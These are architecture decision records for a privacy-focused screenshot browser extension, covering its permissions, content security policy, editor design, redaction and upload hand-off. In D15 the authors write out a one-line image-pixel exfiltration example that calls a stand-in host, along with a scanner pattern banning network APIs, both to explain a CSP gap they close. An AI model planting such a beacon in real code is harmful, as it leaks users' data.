# Decisions

Architecture decision records. Each one exists because the decision looks wrong, or
merely arbitrary, without its reason, and someone (human or agent) will otherwise
"fix" it.

Format: context, decision, consequences. Newest last.

## D1: No build step, no dependencies

**Context.** The failure this project answers is an extension that changes hands and
then ships something unwanted through a silent auto update. Users cannot tell,
because nobody can diff a minified bundle against a repository.

**Decision.** The shipped zip is byte identical to this repository. No bundler, no
transpiler, no minifier, no npm packages, not even in tests.

**Consequences.** Anything a library would give us is written by hand: the zip
writer, the PNG writer and the PDF writer. Tests use Node's built in
runner. The payoff is that `diff -r` against an installed extension is a complete
audit, which no competitor can offer. This is the property everything else defends.

## D2: `chrome.storage.local` only, never `sync`

**Context.** Settings need to persist.

**Decision.** Local storage only. `chrome.storage.sync` is banned by the invariants.

**Consequences.** Settings do not follow the user between machines. In exchange, the
extension never sends a byte to Google's servers, which is a network path it does not
otherwise have.

## D3: Permissions are asked for at the moment of use, not at install

**Context.** Chrome only re-prompts users when permissions increase, so whatever is
granted at install is granted forever, invisibly.

**Decision.** `activeTab`, `scripting` and `storage` at install. `downloads` is
requested on the first real Save click. `webNavigation` and `<all_urls>` are optional
and requested only if the user ticks a settings box that states the cost in plain
words.

**Consequences.** The install prompt asks for no site access at all. The Save button
needs a user gesture, which a popup-less toolbar click cannot supply, and that is one
of the reasons the result opens in a tab rather than a popup.

## D4: The result opens in a tab, and stitching happens there

**Context.** The screenfuls have to be assembled somewhere. The conventional place is
an offscreen document, which needs the `offscreen` permission.

**Decision.** Stitch in the result tab.

**Consequences.** One fewer permission, and Download and Copy are real clicks in a
real page. The cost is that the worker holds the screenfuls until the tab connects.
See [LIMITATIONS.md](LIMITATIONS.md).

## D5: The editor keeps live objects, not baked strokes

**Context.** The simplest annotation editor draws onto the image and keeps an undo
stack of bitmaps.

**Decision.** Shapes are objects in a list. History is a stack of whole snapshots.
The original capture is never drawn into; every frame re-renders from it.

**Consequences.** Selecting, moving, resizing and restyling after the fact all work,
which is the convention in annotation tools and what people expect. Undo is
exact and repeated edits never degrade the image. The cost is that export has to
flatten, and that redaction needs care (see D6).

## D6: Redaction is destructive on purpose

**Context.** A blur laid over recoverable pixels in a layered file is not redaction,
it is a rumour.

**Decision.** Pixelate resamples coarsely from the original and paints it back, and
the export is a flat PNG or JPEG with no layer underneath.

**Consequences.** Redaction in the saved file is real. Adding any layered export
format (a PSD, an SVG with the original embedded) would silently break this, so it
requires revisiting this record first.

## D7: Coordinates are in original capture pixels, always

**Context.** The editor shows a cropped, CSS-scaled view of a large image.

**Decision.** Every stored coordinate is in pixels of the original capture. The view
transform is applied at render time and reversed in `toImage()`.

**Consequences.** Cropping twice, or cropping and undoing, moves nothing. Zoom
(F6) is cheap because the pointer maths already divide by the rendered box size.

## D8: Prefer downscaling over truncation on long pages

**Context.** Chrome refuses canvases larger than 16384px on a side, and a long page
at retina scale exceeds that quickly.

**Decision.** The planner lowers `outputScale` down to a floor of 0.5 before cutting
anything, and the result tab says which happened.

**Consequences.** A very long page comes back complete but softer rather than sharp
and cut in half. Below half resolution the image would be useless, so past that point
truncation is the honest outcome. Multi part export (F10) is the real fix and it
retires this compromise.

## D9: The toolbar button captures immediately, with no popup

**Context.** Most competitors open a popup with a menu of capture modes.

**Decision.** One click captures. `default_popup` is empty in the manifest and is set
only for the duration of a capture, so a second click during a capture shows progress
instead of doing nothing. Extra modes are opt in and off by default.

**Consequences.** The common case is one click. The progress indicator has to be
browser chrome (the icon badge and the popup panel) rather than an overlay drawn into
the page, because the page is what we are photographing.

## D10: `sanitise()` rebuilds settings from `DEFAULTS` and drops unknown keys

**Context.** Storage is user writable in principle, so what comes back out cannot be
trusted.

**Decision.** `sanitise()` starts from a copy of `DEFAULTS` and copies across only
keys it recognises, after validating each one.

**Consequences.** Hostile stored values cannot reach the UI. The trap: a new setting
added to `DEFAULTS` but not to `sanitise()`, or the reverse, is silently written
nowhere. Every setting change must touch both. This is item 4 in the definition of
done in [../AGENTS.md](../AGENTS.md).

## D11: Permissions are never mirrored into settings

**Context.** It would be convenient to store "the user turned on advanced access".

**Decision.** `chrome.permissions.contains()` is the only source of truth.

**Consequences.** No stored flag can disagree with reality after the user revokes
access in `chrome://extensions`, and a disagreement would always have favoured us.

## D12: `nextId` in `src/lib/edit.js` is module state, and that is fine

**Context.** Shape ids come from a module level counter, shared by every document in
a tab. Multi part export (F10) will put more than one document in a tab.

**Decision.** Keep it. Ids only need to be unique within a document, and a shared
counter satisfies that trivially.

**Consequences.** Ids are not dense per document, which nothing depends on. Recorded
so it is not "fixed" into a per document counter by someone who reads a gap in the
numbering as a bug.

## D13: `system-ui` is the interface font, and it is not a design failure

**Context.** Design guidance widely treats a system font stack as the "gave up on
typography" signal.

**Decision.** The UI uses `system-ui` and will keep doing so.

**Consequences.** A webfont is a network request, which the CSP forbids outright. A
self hosted typeface would have to ship as a binary in the repository, inflating the
auditable surface for decoration. The system stack here is a consequence of the
security model, not laziness, so typographic quality has to come from weight,
tracking and scale instead. Recorded so no future design pass "fixes" it.

## D14: Apply and Discard staging was considered and rejected

**Context.** The competitor stages edits until the user presses Apply, and their
locale strings contain five separate "you have unapplied edits" dialogs.

**Decision.** Not adopted. The live object model already makes every edit reversible,
so staging would add a mode the model does not need. What is adopted instead is the
part of it that was actually load bearing: a warning when the tab holds unsaved edits
and the user tries to close it.

**Consequences.** No Apply button, no pending state, no dialogs. The data loss the
staging model protects against is handled by a `beforeunload` guard (task T10).
Maintainer decision, 2026-09-08.

## D15: The CSP gets a floor, not just a `connect-src`

**Context.** The manifest sets
`script-src 'self'; object-src 'none'; connect-src 'none'; frame-src 'none'`.
`connect-src 'none'` blocks `fetch`, `XMLHttpRequest`, WebSocket and
`navigator.sendBeacon`, and `test/lib/scan.js` bans those four names by pattern.

Studying a competitor's "watermark from an image URL" feature exposed the gap. In
CSP, a directive that is absent **and** has no `default-src` to fall back on is
unrestricted. Our policy names no `default-src`, so `img-src`, `style-src`,
`font-src` and `media-src` are wide open. `new Image().src = 'https://x/?d=' + data`
is a network request, it is not blocked by the policy, and it is not caught by the
scanner.

**Decision.** Name every directive:

```
script-src 'self'; object-src 'none'; connect-src 'none'; frame-src 'none';
img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self';
media-src 'none'; base-uri 'none'; form-action 'none'
```

`style-src 'unsafe-inline'` is required because both extension pages carry inline
`<style>` blocks. `data:` and `blob:` are required because that is how captured
tiles and exported images move around. Add a scanner rule for remote subresource
assignment, and an invariant test asserting each directive is present.

**Consequences.** The README's claim that Chrome enforces "no network access" becomes
literally true rather than nearly true. A future contributor cannot exfiltrate with
an image pixel. Verify the pages still render before shipping: a wrong `style-src`
blanks the UI.

## D16: We hand images off. We never upload them.

**Context.** A share or upload button next to Download was requested, for hosts like
Imgur, ImgBB and Google Photos.

The obstacle is not effort, it is that **an extension's content security policy is
static in the manifest**. There is no API to add a `connect-src` allowance when a
user turns a setting on. Shipping a direct API upload means the allowance sits in
the published manifest for every user forever, including everyone who never uploads,
and every future audit stops asking *whether* the extension can send data and starts
asking *what* it sends. That is a different product.

**Decision.** Three tiers, and we ship the first.

**Tier 0, hand off (F25, Phase 2).** The extension writes the PNG to the clipboard,
which it already does and which needs no permission, then opens the chosen host's
upload page in a new tab. The user pastes. ImgBB, Postimages, Catbox and Imgur all
accept a pasted image on their upload page. The extension makes **zero** network
requests; the site the user chose makes them, in a tab they can see.

**Tier 1, assisted hand-off (Phase 4 at the earliest, not committed).** With an
optional host permission for one chosen host, granted at click time and revocable,
inject the image into that page's file input with a `DataTransfer` so no paste is
needed. The extension still issues no request. Open question: moving a 10 to 30MB
blob into a content script means base64 through message passing, which is ugly and
has limits.

**Tier 2, direct API upload. Refused.** It would require `connect-src` entries in
the shipped manifest, and for ImgBB or Imgur an API key. A key committed to an
open-source repository is a public credential we would be answerable for, shared by
every user, and revoked the first time someone abuses it.

**Also decided:** if a link is offered, **default to an expiring one**. A full-page
capture of a logged-in page on a permanent public URL is a privacy accident waiting
to happen, and unlisted is not private. Litterbox (Catbox's temporary variant) takes
an expiry of 1, 12, 24 or 72 hours with no account at all.

**Google Photos specifically:** since 31 March 2025 the Library API only manages
media the calling app itself created, and upload needs the
`photoslibrary.appendonly` scope over OAuth. That means the `identity` permission,
a Google Cloud project, an OAuth client in the manifest and Google's app
verification. It is the heaviest option on the list and it is Tier 2 shaped, so it
is refused with the rest. Drag and drop into the Google Photos tab still works.

**Consequences.** Sharing costs one keystroke. In exchange the sentence "this
extension cannot send your capture anywhere" stays true, which is the sentence the
whole product is built on.

## D17: The toolbar is configured, not collapsed

**Context.** The editor toolbar holds 26 controls in one wrapping row and the
backlog adds more. A design review proposed collapsing the six colour swatches and
three width buttons into two dropdowns, and a before-and-after preview was built for
the decision.

**Decision.** Rejected in favour of the maintainer's alternative: **every tool and
action gets an on/off switch on the options page** (F24), with a curated default set
on and the rest off.

**Consequences.** Nobody pays a permanent extra click for a problem they may not
have, which is what collapsing would have cost the people who change colour often.
The six circular swatches stay visible by default. Two new obligations come with it:
the default set has to be genuinely good, because most people never open settings,
and a hidden tool must still be reachable, which is one of the arguments for the
command palette (F18). F24 must land before any release that adds toolbar controls.
Decided 2026-09-09.

## D18: The toolbar follows Preview's grouping model

**Context.** D17 settled that the toolbar is configured rather than collapsed. It did
not settle how the controls that remain are arranged. Four screenshots of macOS
Preview's markup toolbar, provided 2026-09-09, answer that.

Preview exposes roughly sixty controls through **thirteen buttons**:

- **Every button carries a small chevron.** Clicking the button uses the tool or
  applies the current value; clicking the chevron opens a popover holding the whole
  related set.
- **The button's glyph is its current state.** The border colour button *is* a
  swatch of the current colour. The fill button shows a diagonal slash when fill is
  off. The shape style button draws the current stroke weight.
- **Related settings are grouped by concept, not by widget type.** One "Shape Style"
  popover holds five stroke weights, two dash patterns, three arrow endings and a
  shadow toggle. One "Text Style" popover holds family, size, colour, bold, italic,
  underline and four alignments.
- **Heavy tools get a floating inspector, not a popover.** Adjust Colour opens a
  panel with a live histogram, nine sliders, Auto Levels and Reset All.
- **The whole markup row is itself hidden** behind one button in the window toolbar.

**Decision.** Adopt the pattern. The editor toolbar becomes roughly eighteen buttons:
Select, Shapes (box, ellipse, line, arrow, highlight behind one chevron), Draw, Text,
Step, Redact, Crop, Style, Colour, Zoom, then the history group, then the output
group. Every grouped button shows its current value as its glyph and remembers the
last choice, so repeated use stays one click. Keyboard shortcuts stay bound to the
individual tools, unchanged, so grouping costs a mouse click and never a keystroke.
Phase 3's adjustments become a floating inspector rather than more toolbar buttons.

**Consequences.** Nineteen buttons carry sixty eight controls where today's twenty six carry twenty six
carry, which is what makes room for Phases 2 to 4 without a second toolbar row. The
cost is one extra click to switch between shapes that currently sit side by side, and
that cost falls only on the mouse, which is the trade Apple made in the same
situation. D17 still holds: the options page can hide any of the nineteen.

## D19: Selection chrome is drawn in screen space, shape geometry in image space

**Date.** 2026-09-09.

**Decision.** Anything the editor draws *about* a shape rather than *as part of* it,
meaning selection outlines, resize handles, hover outlines and snap guides, is sized in
screen pixels and divided by the current display factor before it is drawn. Everything
that is part of the image, meaning stroke widths, font sizes and shape geometry, stays
in image pixels and scales with the capture.

**Why.** The two kinds of drawing have opposite requirements and the code did not
separate them. A 4px stroke must stay 4px in the exported PNG whatever the zoom. A 9px
handle must stay 9px under the user's finger whatever the zoom. `drawSelection()` drew
both in image pixels, so on a 14,000px capture fitted to the window at roughly 12%, its
nine pixel handles rendered at one pixel and its 1.5px dashed outline rendered at 0.18
of a pixel, which is to say not at all.

**The evidence that this was a defect and not a design choice.** `pickTolerance()`, three
functions away in the same file, already divides by that same display factor. The hit
target was corrected for zoom and the drawing was never corrected with it, which is why
the handles on a long capture can be grabbed but not seen.

**Rejected: handles proportional to the image.** That is the same bug pointing the other
way. On a 14,000px capture the handles would be enormous, and on a small one they would
vanish. Every general purpose editor holds the handle at a constant size on
screen. Constant on screen is what the user was asking for.

**Consequences.** One helper, `screenScale()`, is the only place that knows the display
factor, and both the drawing and the hit test read it. This matters more once F6 lands
zoom, because the factor then varies continuously rather than only with capture length.
The task is T20 and it ships in 1.7.0, ahead of the toolbar, because it is a repair.

## D20: The custom colour is the operating system's picker, not one we drew

**Date.** 2026-09-09.

**Decision.** The custom swatch at the bottom of the Border and Fill popovers is a
native `<input type="color">` next to a hex text field. It is not a hand-drawn
saturation square with a hue slider, which is what the preview sketched.

**Why.** Preview's own *Show Colours…* opens the macOS system colour panel rather
than a picker Apple drew inside Preview. Copying the pattern properly therefore
means opening the platform picker, and doing so gets three things we would
otherwise have to build and would build worse: an eyedropper that can sample any
pixel on the screen, full keyboard operation, and the recent-colours list the user
already has from every other application.

**What the hex field adds.** The one thing the native picker is poor at is pasting
a brand colour from a style guide. The text field takes `#4338CA` or `4338ca`,
normalises it, and puts the previous value back if what was typed is not a colour.
That is the case the picker does not cover, and it is the common one at work.

**Rejected: an inline spectrum.** It is around 120 lines of pointer maths, it needs
its own focus handling and ARIA to be usable by keyboard, it has no eyedropper, and
it would be a worse version of a control the operating system ships. If the inline
panel is wanted later for visual consistency across platforms, it replaces the
`<input type="color">` and nothing else changes.

## D21: Text alignment waits for multi-line text

**Superseded by D39 on 2026-09-09.** Kept because the reasoning still holds and
explains why the control was absent for a while: the answer was to make the
condition true, not to ship the buttons anyway.


**Date.** 2026-09-09.

**Decision.** The text inspector ships family, size, bold, italic and underline.
Alignment, which the preview showed, is not in it.

Colour is not in it either, and that is a second decision hiding inside the first.
Text takes the border colour, the same control every other shape takes its stroke
from, because a second colour picker that happens to apply only to text is one more
place for the two to disagree. The inspector says where the colour comes from
rather than leaving the reader to find out.

**Why.** Alignment describes how lines sit relative to each other, and the inline
text editor is a single-line `<input>`. Shipping the control now would mean four
buttons that provably cannot change anything, which is worse than the gap: a
control that does nothing teaches people not to trust the toolbar.

**When it lands.** With multi-line text entry, which is its own piece of work
because of L17: the entry box is positioned once from the canvas bounding box, and
growing it to a `<textarea>` interacts with both that and with Enter, which
currently commits. The inspector has a line saying so, rather than staying silent.

## D22: The mark is a caricature of a camera, on a disc

**Date.** 2026-09-09.

**Decision.** A retro camera with an oversized lens, cream on a teal disc. Teal, not
indigo, and specifically not violet.

**Why a caricature.** A correctly proportioned camera is a picture of a camera and
looks like every other one. A camera that is mostly lens is a character. It also
survives the only rendering that matters: at 16px the lens is the single mass that
still reads, and the two bumps on the top edge are what stop the body being a
suitcase.

**Why a disc.** Every other extension in the toolbar is a rounded square. A circle
is the one silhouette that is not.

**Why teal.** It has to hold against both the light (#F1F3F4) and dark (#292A2D)
Chrome toolbars, which rules out anything pale and anything near black. It also
leaves amber free, and amber means one thing in this product: a capture is running.

**What was rejected, so it is not redrawn.** Four crop marks around a narrow page,
which put five elements inside sixteen pixels and lost all of them. A folded sheet
of paper, which read cleanly but said "document". A version of that bleeding off the
top edge, which left the tile as two uprights and a floor and read as a letter U. A
monoline camera and a ringed badge, both of which dissolved at 16px. An aperture of
six blades, which read as a star. A cream disc with the camera cut out of it, which
disappeared into the light Chrome toolbar. All six are kept as images in the logo
options folder outside the repository.

**Consequence, still open.** The extension interface is still indigo. A teal mark on
an indigo interface is incoherent, but recolouring the interface is a visible change
and the standing agreement is that those need a before and after preview first.

## D23: Rendered-page checks, because property assertions lied

**Date.** 2026-09-09.

**Decision.** `test/e2e/page-audit.js` asks the browser what it actually drew, and
runs on the result tab and the options page on every end-to-end run.

**Why.** Three CSS specificity collisions shipped in a single day. Every one of them
had correct JavaScript, and one of them had a passing test: the popover check read
`element.hidden`, which was set correctly the whole time, while a `display: flex`
rule of equal specificity further down the stylesheet meant the popover never
actually hid. The property was right and the pixels were wrong.

**What it measures.** Contrast of every visible label against the colour genuinely
painted behind it, content wider than the window that is not inside a scroll
container, broken images, and skipped heading levels.

**What it found on its first run.** Four real defects, none of which any existing
test could have seen: an accent that never lifted in the dark theme, a button whose
text colour did not invert with its background, links at 4.25:1, and dead CSS.

**Consequence.** Point 7 of the definition of done. A change to an interface is not
finished until the browser agrees.

## D24: Settings travel as a file the user carries

**Date.** 2026-09-09.

**Decision.** The options page exports settings as JSON and imports them back.

**Why.** D2 bans the synced storage area, so settings deliberately do not follow
anyone between machines. That is a real cost and pretending otherwise would be
dishonest. A file is the honest replacement: it moves the same data, the user can
read it first, and it goes nowhere they did not put it.

**Why import is safe.** It goes through the same `sanitise()` that every read from
storage already goes through, because storage was always treated as untrusted.
Unknown keys are dropped and every value is clamped, so a hand-edited or hostile
file cannot introduce a setting we do not know or a value outside its range. The
page says how many entries it ignored rather than silently discarding them.

## D25: Feedback composes an email, it does not post one

**Date.** 2026-09-09.

**Decision.** The support form on the options page builds a `mailto:` and opens the
user's own mail application. It does not submit anywhere.

**Why.** Posting a form needs network access, and the extension has none. This is
not a workaround, it is the only design consistent with the first rule: nothing
leaves the page until the person presses send in their own client, under their own
account, having read what they are sending.

**Diagnostics are shown, not hidden.** The optional "include your version and
settings" block is printed in full on the page before anything is composed. A
diagnostics blob nobody can read is exactly the pattern this project exists to
avoid. It carries the extension and browser version, the platform, whether the
optional permission is granted, and the settings. No page addresses and nothing
about what has been captured.

**What changes when a mail service is added later.** Nothing in the extension. A
service would receive mail at the support address; it would not give the extension
a network path it does not have.

## D26: Upload is a hand-off, and it shipped that way

**Date.** 2026-09-09. Implements D16.

**Decision.** The Upload button copies the image to the clipboard and opens the
chosen host in a new tab. The extension performs no upload.

**Why not a real upload.** An extension's content security policy is static, in the
manifest. A `connect-src` allowance for an image host would therefore ship
permanently, to every user, including everyone who never uploads. From that moment
"this extension cannot send your capture anywhere" would be false, and every future
audit would stop asking whether it can send data and start asking what it sends.

**Hosts, and why these three.** ImgBB for the largest anonymous free cap and
optional expiring links, Postimages for direct links without an account, and
Litterbox because it is anonymous and deletes itself after 1 to 72 hours. A full
page capture of a logged-in page on a permanent public URL is a privacy accident,
so an expiring option is deliberately present.

**The popover says so.** In as many words: the extension does not upload anything
and cannot.

## D27: Every step that crosses into a page has a deadline

**Date.** 2026-09-09.

**Decision.** No `await` in the capture orchestration may wait indefinitely.
`chrome.scripting.executeScript`, `chrome.tabs.create` and the page restore are
each wrapped in `withTimeout`. A step that times out *after* the walk has begun
ends the walk and delivers what was captured; only a step that times out before
anything is in hand fails the capture.

**Why.** The screenfuls are held in the service worker until the walk finishes,
which is what lets the result tab open on a finished capture rather than an empty
one (see the header of `src/background.js`). The cost of that choice is that one
step which never settles destroys every screenful taken so far, silently: the
toolbar icon reads 100%, the panel reads "Screen 11 of 11", and nothing ever
opens.

That was a real report, not a hypothesis. It happens on pages whose scripts never
go quiet, where an advertising frame keeps the tab busy and
`executeScript({ allFrames: true })` never resolves because Chrome waits for every
frame. `restorePage` runs in all frames on every single capture, so the wedge sat
directly between the last screenful and the result tab.

**Why bounded rather than avoided.** The alternative is to stop scripting frames
we do not control, and that is what makes sticky headers appear once and scroll
position come back. The behaviour is worth keeping; waiting forever for it is not.

**Why a stalled walk still delivers.** A short image of a page is useful. No image
of a page is not, and the user cannot tell the difference between "still going"
and "will never finish" from the outside. The result tab says which happened.

## D28: The progress panel can be told to finish now

**Date.** 2026-09-09. Depends on D27.

**Decision.** Once a screenful has landed, the progress popup shows a Finish now
button. It sets a flag; the walk reads it between screenfuls and, on a wide page,
only at the start of a row. The capture is delivered short, trimmed to the part
that was reached, and says so.

**Why.** Some pages never stop growing. A feed appends as fast as it is
photographed; a page can be complete to the reader and still loading forever as far
as the extension can tell. Re-planning after each screenful (which is what stops a
lazily-loaded page being cut off) means the walk follows the growth. There is no
heuristic that separates "nearly done" from "will never be done", so the reader
decides.

**Why not a cancel button.** Cancelling throws the work away, which is the outcome
the user was already stuck with. Finishing keeps it.

**Why hidden until the first screenful.** A button offering to finish a capture
that has captured nothing would hand back an empty image.

**Why the canvas is trimmed.** The plan sized a canvas for the whole page. Handing
that over unchanged produces an image as tall as the page with everything below the
stop left blank, which reads as a broken capture rather than a short one.

## D29: Saving straight to a file is opt-in and asks for the permission up front

**Date.** 2026-09-09.

**Decision.** A setting sends the finished capture to the downloads folder and
closes the tab it was written from, with no editor. It is off by default. The
options page requests the `downloads` permission at the moment the switch is turned
on, and refuses to store the setting if that is declined.

**Why the permission is asked there.** `chrome.permissions.request` needs a user
gesture. The whole point of this mode is that there is no click after the toolbar
button, so the click has to be the one that turns the setting on. The result tab
checks with `permissions.contains` rather than asking, and falls back to showing
the editor if the answer is no. A switch that reads as on and silently opens the
editor anyway would be worse than not having it.

**Why the tab exists at all.** Stitching happens in a page, because doing it in the
background would need the `offscreen` permission (D6). So a capture always has a
tab; this mode opens it in the background, saves from it, and closes it.

**Why it waits for the download.** The file is read from a blob URL owned by that
document. Closing the tab before Chrome has finished reading it truncates the file.
It waits for `downloads.onChanged` to report the download settled, and closes anyway
after fifteen seconds: an extra tab is recoverable, a half-written file is not.

## D30: A crop is proposed, not applied

**Date.** 2026-09-09.

**Decision.** Dragging with the crop tool draws a region and stops there. The
region dims everything outside it, carries eight handles and can be slid whole,
and a bar with a tick and a cross applies or abandons it. Enter and Escape do the
same. Nothing is committed until the tick.

**Why.** Cropping was the one destructive edit in the editor and the only one with
no chance to look at it first: it happened on pointerup, at whatever rectangle the
mouse released on. Undo could put it back, but "draw it again, more carefully" is
not a fine-tune, and on a capture displayed at eight per cent a few pixels of
pointer travel is a hundred pixels of image.

**Why the bar is a real element and not drawn on the canvas.** Three reasons. It
is a button, so it gets focus, hover, a name and a keyboard. It can be positioned
against the viewport rather than the image. And it does not have to be hit tested
in canvas coordinates, which for a control that must stay a constant size on
screen means undoing the display scale twice.

**Why it is fixed to the viewport.** A capture is often ten screens tall. Judging
the edges of a crop means scrolling, and a button anchored to the region is off
screen exactly when it is wanted. It sits below the region when there is room,
above it when there is not, and inside the window when the region is bigger than
the window.

**Why cancelling leaves no undo step.** Nothing was committed, so there is nothing
to undo. A cancelled crop that consumed a Cmd+Z would be worse than no cancel.

**What still does not happen.** Exporting while a region is pending exports the
uncropped image. The region is a proposal and applying it is one keystroke; making
export silently apply it would be a different, larger surprise.

## D31: PDF is written by hand, losslessly, and paginated

**Date.** 2026-09-09.

**Decision.** `src/lib/pdf.js` writes a small subset of PDF 1.4 directly: a
catalogue, a page tree, and one Flate-compressed RGB image per page. The image is
cut into pages of its own width, with no scaling and no margins.

**Why by hand.** Rule 3. A PDF library is a dependency and a build step, and the
subset needed to put a screenshot in a PDF is about a hundred lines.

**Why not JPEG, which PDF supports directly.** `/DCTDecode` would have been a
dozen lines. This tool photographs text, JPEG rings around every glyph edge, and a
PDF of a screenshot that softens the text is a worse artefact than the PNG it was
meant to replace. Raw RGB through `/FlateDecode` is lossless, and deflate is
available to the page as `CompressionStream`, which costs the package nothing.

**Why pages rather than one long one.** A full page capture is often ten screens
tall. One page that shape is valid PDF and useless: readers open it at four per
cent and it cannot be printed. Acrobat also refuses a page longer than 200 inches.

**Why the height is divided evenly rather than taken off the top.** Walking down in
full pages leaves the remainder on the last one, which for a 1700 pixel image at an
849 pixel step is a page two pixels tall. The count is decided first and the height
divided across it, so no page is a sliver.

**Why no creation date.** The only thing a timestamp adds to a file the user is
about to share is the moment they took the screenshot. `/Producer` is kept, because
provenance is the point of this project; `/CreationDate` is not.

## D32: The theme has three states, and the third one is not a colour

**Date.** 2026-09-09.

**Decision.** `system`, `light`, `dark`, on one toolbar button that rotates through
them and on the settings page as a list. `system` is the default and stamps no
`data-theme` attribute at all, so the stylesheets fall through to
`prefers-color-scheme`.

**Why that matters.** A `system` that stamps light is the bug nobody notices until
their machine switches to dark in the evening and the extension does not. It is
also why every dark token is written twice, once behind the media query guarded as
`:root:not([data-theme="light"])` and once behind `:root[data-theme="dark"]`: an
explicit choice has to beat the operating system in both directions.

**The flash is accepted.** The choice lives in `chrome.storage`, which is
asynchronous, and the content security policy forbids an inline script, so the
attribute cannot be stamped before the first paint. A user who has overridden the
system theme sees the system one for a frame. The alternative is permitting inline
script on every page forever, to save one frame.

**Why the settings page carries it too.** The toolbar button can be switched off
like every other toolbar control, and a setting reachable only from a button you
can hide is a setting you can lose.

## D33: Reset does the obvious thing for where you are

**Date.** 2026-09-09.

**Decision.** The button formerly called Revert is called Reset. With edits on the
canvas it removes them, which is what it always did. With none, it puts the drawing
style back to the shipped defaults: the tool, the colours, the stroke, the fill and
the type.

**Why the second behaviour exists.** Those choices are remembered between captures
on purpose, so that picking red and a seven pixel stroke once means the next
capture opens on red and seven pixels. Anything remembered forever needs a way
back, and there was none.

**Why one button and not two.** A second button that is disabled whenever the first
is enabled is two controls occupying one slot and explaining nothing. A fresh
capture is the one moment when "reset" cannot mean anything else, so that is when
it means the other thing. The tooltip says which it will do.

**What it deliberately does not touch.** The output format, which toolbar controls
are showing, the theme, and the capture settings. Those are separate choices and
sweeping them up would be a surprise, which is the one thing a reset button must
never be. `STYLE_KEYS` in `src/lib/settings.js` names exactly what it restores, and
a test asserts the rest are not in it.

**Why the internal name stayed `revert`.** The element id and the `hiddenButtons`
entry are both `revert`. Renaming them would silently un-hide the button for
anyone who had hidden it, which is a worse outcome than an id that does not match
its label.

## D34: What this repository names, and what it does not

**Date.** 2026-09-09. Taken when the repository was opened to the public.

**Decision.** Three rules.

1. **Nothing a reader meets names another product.** `src/` and `manifest.json` are
   scanned for a list of product names and CI fails if one appears, and so are
   `docs/`, `store/`, `tools/` and the Markdown at the root. Design conventions are
   described as conventions, because that is what they are and nobody owns them.

   The prose was added to the scan on 2026-09-09, one day after the rule was
   written, because cleaning only `src/` had moved the problem rather than solved
   it. The names and the claims were still sitting in a working note, a deferred
   task and a roadmap row, which is where a reader who cares would look first.
2. **Claims about identifiable competitors are removed unless they are sourced.**
   This repository asserted, in several files, that a named extension was delisted
   on a particular date and that another was a security counter-example. Both may
   well be true; neither was sourced here. The lesson each one carried is kept, the
   identification is not.
3. **`NOTICE.md` is the exception and stays exactly as it is.** The MIT licence of
   the work this is derived from requires the attribution, and the disclaimer of
   association with any commercial successor is protective rather than risky:
   naming a mark in order to say you are not it is what a disclaimer is.

**Why, given that naming a competitor factually is lawful.** Because this is
hygiene, not law. Comparing products by name is ordinary and legal; a comment in
shipped code saying a control was taken from a named product is the document you
least want to own in a dispute, whatever the code actually does. It also costs
nothing to avoid, and the neutral phrasing is usually more accurate: the convention
belongs to the category, not to whoever we happened to look at.

**What this did not fix on its own.** Git history. Every sentence removed here was
still in the commit that added it, and making a repository public publishes its
history. That was left as the maintainer's decision, and it was taken the next day:
see D35.

**Not legal advice.** This is a set of engineering conventions decided by the
maintainer. Nobody here is a lawyer.

## D35: The history was rebuilt before the repository was published

**Date.** 2026-09-09. Taken immediately before the repository was made public.

**Context.** D34 removed a set of claims from the working tree and said plainly that
git history still carried every one of them. Twenty two commits, one author, no
forks, no published tags, no open pull requests, and nobody but the maintainer had
ever cloned it. The claims removed were the kind whose whole problem is that they
are readable: an assertion that a named extension shipped malware, install counts
repeated from news coverage, a path to a competitor's unpacked extension on the
maintainer's disk.

**Decision.** Rebuild the history from the sanitised tree, as a single commit, and
publish that. The alternative considered was a text replacement across all twenty
two commits with `git filter-repo`, which keeps the development narrative.

**Why the narrative lost.** Two reasons, and the second is the real one.

A replacement pass has to enumerate every phrasing of every claim across twenty two
commits, and it takes only one variant spelled differently to leave the thing you
were removing in the published history. A squash has no long tail: what is published
is exactly the tree that was reviewed.

And the narrative was worth less than it looks. This project's auditability claim is
"the shipped zip is byte identical to this repository", which is a statement about
one tree and rests on git history not at all. A first public commit is the ordinary
shape of a first public release, and the development record that actually matters is
`CHANGELOG.md` and this file, both of which are in the tree and survive intact.

**Consequences.** Every commit hash before the rebuild is gone, and the remote was
force pushed, which is destructive and was done once, deliberately, with the
maintainer's explicit instruction. `git blame` now dates everything to one day, so
this file and the changelog are the only record of when a decision was actually
taken, which raises rather than lowers the cost of not writing one down. From this
commit onward the history is append only: it is public, and rewriting published
history is a different act entirely from rewriting history nobody has ever seen.

## D36: The capture is laid on a solarized mat, not on the page background

**Date.** 2026-09-09.

**Context.** The result tab painted its background with `--sunken`, which is
`#fafafa` in light and `#101012` in dark. A screenshot of an ordinary web page is
white or near-white at its edges, so in light mode the capture had no visible edge
at all: the reader could not see where their image stopped and the tab began. In
dark mode the opposite happened, a white slab on near-black, which is correct but
harsh.

**Decision.** A dedicated `--mat` token for the surface the capture sits on, and
nothing else. Solarized base3 `#fdf6e3` in light, base03 `#002b36` in dark. The
canvas edge is drawn with `--mat-edge` rather than `--line`, because the interface
line colour is a neutral grey that vanishes into a warm background.

**Why solarized rather than a grey.** Its two backgrounds are a designed pair,
built to hold the same relationship to their foregrounds in either direction. One
token swap gives a mat that works in both themes, instead of two greys guessed
separately and each checked on its own. The warmth also does the actual job: it is
different enough from any screenshot's own white to draw the boundary, without
being a colour that competes with the image.

**Consequences.** `--muted` had to be darkened from `#71717a` to `#6b6b73`. Against
`#fdf6e3` the old grey measured 4.48:1, which misses 4.5:1, and three labels sit
directly on the mat. The rendered-page audit caught it, which is what it is for.
The change was applied to the settings page too, so the two pages do not drift
apart over a colour neither of them needs to differ on.

**What it deliberately does not touch.** The toolbar, which keeps `--surface`, so
it still reads as browser chrome above the mat rather than as part of the image.

## D37: `hidden` is not a property of SVGElement

**Date.** 2026-09-09. Written as a decision rather than a fix note because it is a
trap that had already been walked into three times in the same file.

**Context.** `element.hidden = true` is the ordinary way to show and hide things in
this codebase, and it works, because `hidden` is defined on `HTMLElement`.
`SVGElement` does not inherit from `HTMLElement` and has no such property. Assigning
to it therefore sets a plain JavaScript property on the object, leaves the content
attribute untouched, and changes nothing that is painted.

Three places did exactly that. The theme button carries three glyphs and shows one;
it showed the monitor icon and kept showing it through the whole cycle, while the
tooltip and the aria-label updated correctly, so the button said one thing and drew
